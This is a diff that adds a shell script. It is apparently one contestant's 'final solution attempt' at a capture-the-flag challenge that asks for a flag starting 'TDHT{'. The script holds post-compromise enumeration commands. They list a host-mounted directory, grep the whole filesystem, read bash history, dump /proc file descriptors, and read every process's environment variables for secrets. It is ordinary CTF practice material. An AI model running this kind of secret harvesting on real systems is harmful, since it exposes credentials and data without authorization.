@@ -1,0 +1,64 @@
+# STOLEN SCHEMATICS - FINAL SOLUTION ATTEMPT
+# Based on recon findings:
+# 1. /opt/mc/.sync is MOUNTED from host (shared storage!)
+# 2. Diagnostic images exist in registry
+# 3. Watcher is NOT processing our configs
+
+echo "=== SOLUTION ATTEMPT 1: Check .sync directory contents ==="
+# Since it's mounted from host, maybe flag is already there!
+ls -la /opt/mc/.sync/
+find /opt/mc/.sync/ -type f 2>/dev/null
+cat /opt/mc/.sync/* 2>/dev/null
+
+echo -e "\n=== SOLUTION ATTEMPT 2: Search diagnostic image ==="
+# Run the Python script to search diagnostic images
+# (Copy from STOLEN_SEARCH_DIAGNOSTIC.txt)
+
+echo -e "\n=== SOLUTION ATTEMPT 3: Check if flag is in simple locations ==="
+cat /flag 2>/dev/null
+cat /flag.txt 2>/dev/null  
+cat /root/flag.txt 2>/dev/null
+cat /home/flag.txt 2>/dev/null
+cat ~/flag.txt 2>/dev/null
+
+echo -e "\n=== SOLUTION ATTEMPT 4: Search ALL readable files for TDHT ==="
+find / -type f -readable 2>/dev/null | head -200 | xargs grep -l "TDHT{" 2>/dev/null
+
+echo -e "\n=== SOLUTION ATTEMPT 5: Check bash history for clues ==="
+cat ~/.bash_history | grep -i flag
+cat ~/.bash_history | grep -i TDHT
+
+echo -e "\n=== SOLUTION ATTEMPT 6: Check if watcher left any output ==="
+find /opt/mc -name "*result*" -o -name "*output*" -o -name "*sync*" 2>/dev/null
+cat /opt/mc/logs/latest.log | grep -i "TDHT\|flag\|sync" | tail -20
+
+echo -e "\n=== SOLUTION ATTEMPT 7: Read sync-loop.sh via /proc ==="
+# Maybe we can read it through proc filesystem
+cat /proc/16/cmdline 2>/dev/null | tr '\0' '\n'
+ls -la /proc/16/cwd 2>/dev/null
+readlink /proc/16/cwd 2>/dev/null
+readlink /proc/16/exe 2>/dev/null
+
+# Try to get the script content from fd
+ls -la /proc/16/fd/ 2>/dev/null
+for fd in /proc/16/fd/*; do 
+    echo "FD: $fd"
+    cat $fd 2>/dev/null | head -20
+done
+
+echo -e "\n=== SOLUTION ATTEMPT 8: Check environment of ALL processes ==="
+for pid in $(ps aux | awk '{print $2}' | tail -n +2); do
+    echo "PID $pid:"
+    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "flag\|TDHT" && echo "^^^ FOUND IN PID $pid ^^^"
+done
+
+echo -e "\n=== SOLUTION ATTEMPT 9: Mount information ==="
+# /opt/mc/.sync is mounted - maybe we can find more info
+mount | grep sync
+cat /proc/mounts | grep sync
+
+echo -e "\n=== SOLUTION ATTEMPT 10: Check for CTF infrastructure hints ==="
+# Look for CTF-specific files
+find / -name "*ctf*" -o -name "*challenge*" -o -name "*tdh*" 2>/dev/null | head -20
+cat /etc/hostname
+cat /etc/hosts | grep -v "^#"
